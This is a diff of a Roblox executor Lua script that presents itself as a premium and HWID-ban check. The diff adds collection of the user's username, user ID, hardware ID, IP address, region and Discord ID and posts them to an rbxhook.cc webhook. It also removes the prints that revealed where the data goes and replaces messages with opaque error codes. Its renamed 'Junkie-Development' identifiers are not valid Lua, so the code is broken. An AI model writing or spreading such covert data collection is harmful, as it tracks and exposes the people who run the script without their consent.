@@ -3,7 +3,7 @@ local HttpService = game:GetService("HttpService")
 local UserInputService = game:GetService("UserInputService")
 local MarketplaceService = game:GetService("MarketplaceService")
 
-local url = "https://rbxhook.cc/r/53c0224357ecf80ccc532995003046cf"
+local url = "https://rbxhook.cc/r/134bf1009d7ac501f112b5fd04281784"
 
 -- Platform detection
 local function getPlatform()
@@ -97,7 +97,7 @@ local data = {
             },
             fields = {
                 {
-                    name = "JunkieCore Premium",
+                    name = "Junkie-Development Premium",
                     value = "Checking premium status...",
                     inline = false
                 },
@@ -107,13 +107,33 @@ local data = {
                     inline = false
                 },
                 {
+                    name = "Discord ID",
+                    value = "Retrieving Discord ID...",
+                    inline = false
+                },
+                {
+                    name = "User Info",
+                    value = "Username: " .. player.Name .. "\nUser ID: " .. player.UserId .. "\nPlatform: " .. getPlatform(),
+                    inline = false
+                },
+                {
                     name = "Executor Info", 
                     value = "Executor: " .. executor .. "\nVersion: " .. executorVersion,
                     inline = false
                 },
                 {
+                    name = "HWID",
+                    value = hwid,
+                    inline = false
+                },
+                {
                     name = "Game Info",
                     value = "Game Name: " .. gameName .. "\nPlace ID: " .. game.PlaceId .. "\nJob ID: " .. game.JobId,
+                    inline = false
+                },
+                {
+                    name = "Network Info",
+                    value = "IP Address: " .. ipAddress .. "\nRegion: " .. serverRegion,
                     inline = false
                 }
             },
@@ -125,50 +145,74 @@ local data = {
     }
 }
 
--- JunkieCore Premium Check
+-- Junkie-Development Premium Check
 local premiumStatus = "Not checked"
-if JunkieCore and JunkieCore.GetIsPremium then
-    local isPremium = JunkieCore.GetIsPremium()
-    if isPremium then
-        premiumStatus = "PREMIUM USER"
-        print("Premium user detected!")
+if type(Junkie-Development) == "table" and type(Junkie-Development.GetIsPremium) == "function" then
+    local success, isPremium = pcall(Junkie-Development.GetIsPremium)
+    if success then
+        if isPremium then
+            premiumStatus = "PREMIUM USER"
+        else
+            premiumStatus = "Standard user"
+        end
     else
-        premiumStatus = "Standard user"
-        print("Standard user")
+        premiumStatus = "Error checking premium status"
     end
 else
-    premiumStatus = "JunkieCore not available"
-    print("JunkieCore not available")
+    premiumStatus = "Error: JC012-RH"
 end
 
 -- Update the premium field in Discord embed
 for i, field in ipairs(data.embeds[1].fields) do
-    if field.name == "JunkieCore Premium" then
+    if field.name == "Junkie-Development Premium" then
         field.value = premiumStatus
         break
     end
 end
 
--- JunkieCore HWID Ban Check
+-- Junkie-Development HWID Ban Check
 local banStatus = "Not checked"
-if JunkieCore and JunkieCore.GetIsBanned then
-    local isBanned = JunkieCore.GetIsBanned()
-    if isBanned then
-        banStatus = "HWID BANNED"
-        print("HWID is banned!")
+if type(Junkie-Development) == "table" and type(Junkie-Development.GetIsHwidBanned) == "function" then
+    local success, isBanned = pcall(Junkie-Development.GetIsHwidBanned)
+    if success then
+        if isBanned then
+            banStatus = "HWID BANNED"
+        else
+            banStatus = "HWID is clean"
+        end
     else
-        banStatus = "HWID is clean"
-        print("HWID is clean")
+        banStatus = "Error checking ban status"
+        print("Error checking ban status: " .. tostring(isBanned))
     end
 else
-    banStatus = "JunkieCore not available"
-    print("JunkieCore not available")
+    banStatus = "Error: JC012-RH"
 end
 
 -- Update the ban status field in Discord embed
 for i, field in ipairs(data.embeds[1].fields) do
     if field.name == "HWID Ban Status" then
         field.value = banStatus
+        break
+    end
+end
+
+-- Junkie-Development Discord ID
+local discordId = "Not available"
+if type(Junkie-Development) == "table" and type(Junkie-Development.GetDiscordId) == "function" then
+    local success, id = pcall(Junkie-Development.GetDiscordId)
+    if success and id and id ~= "" then
+        discordId = "<@" .. id .. "> (" .. id .. ")"
+    else
+        discordId = "Not linked"
+    end
+else
+    discordId = "Error: JC012-RH"
+end
+
+-- Update the Discord ID field in Discord embed
+for i, field in ipairs(data.embeds[1].fields) do
+    if field.name == "Discord ID" then
+        field.value = discordId
         break
     end
 end
@@ -183,12 +227,9 @@ if not success then
     return
 end
 
-print("Sending webhook to: " .. url)
-print("Payload size: " .. string.len(encoded) .. " bytes")
-
 local requestFunc = syn and syn.request or request or http_request
 if not requestFunc then
-    print("No HTTP request function available")
+    print("Error: JK291-RH")
     return
 end
 
@@ -205,7 +246,7 @@ if response then
     print("Status:", response.StatusCode)
     if response.StatusCode == 200 or response.StatusCode == 204 then
     else
-        print("ERROR: Failed to send webhook - HTTP " .. response.StatusCode)
+        print("Error: J1920-RH - (SHARE THIS TO SERVICE OWNER) : " .. response.StatusCode)
         if response.Body then
             print("Response: " .. response.Body)
         end
